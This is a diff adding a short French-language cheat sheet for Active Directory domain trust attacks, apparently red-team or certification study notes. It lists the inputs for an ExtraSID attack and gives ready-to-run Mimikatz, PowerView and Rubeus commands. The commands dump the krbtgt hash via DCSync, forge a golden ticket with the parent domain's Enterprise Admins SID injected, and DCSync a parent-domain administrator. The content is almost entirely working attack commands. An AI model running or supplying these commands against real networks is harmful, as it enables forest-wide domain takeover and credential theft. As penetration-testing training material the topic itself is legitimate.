@@ -1,0 +1,28 @@
+###DomainTrust_Attacks
+
+##ExtraSID Attack
+#Elements requis:
+1-Hash KRBTGT du domaine enfant
+2-SID du domaine enfant
+3-Nom d'un user dans le domaine enfant (Il n'a pas besoin d'exister)
+4-FQDN du domaine enfant
+5-SID du groupe 'Enterprise Admins' du domaine parent
+
+Mimikatz:
+1 & 2 & 4 - mimikatz --> lsadump::dcsync /user:<DOMAIN>\krbtgt
+
+PowerView:
+2 - Get-DomainSID
+5 - Get-DomainGroup -Domain <DOMAIN> -Identity "Enterprise Admins" | select distinguishedname,objectsid
+
+#Golden ticket
+mimikatz --> kerberos::golden /user:<3> /domain:<4> /sid:<2> /krbtgt:<1> /sids:<5> /ptt
+Puis confirmer avec: klist et le C:// du dc (avec "ls")
+
+rubeus --> .\Rubeus.exe golden /rc4:<1> /domain:<4> /sid:<2> /sids:<5> /user:<3> /ptt
+Puis confirmer avec: klist et le C:// du dc (avec "ls")
+
+Confirmation possible avec DCSync Attack contre un admin du domaine parent:
+mimikatz --> lsadump::dcsync /user:<domain>\<user_adm>
+Si le domaine du user n'est pas le même que le domaine de la target
+mimkatz --> lsadump::dcsync /user:<domain>\<user_adm> /domain:<domain_cible>
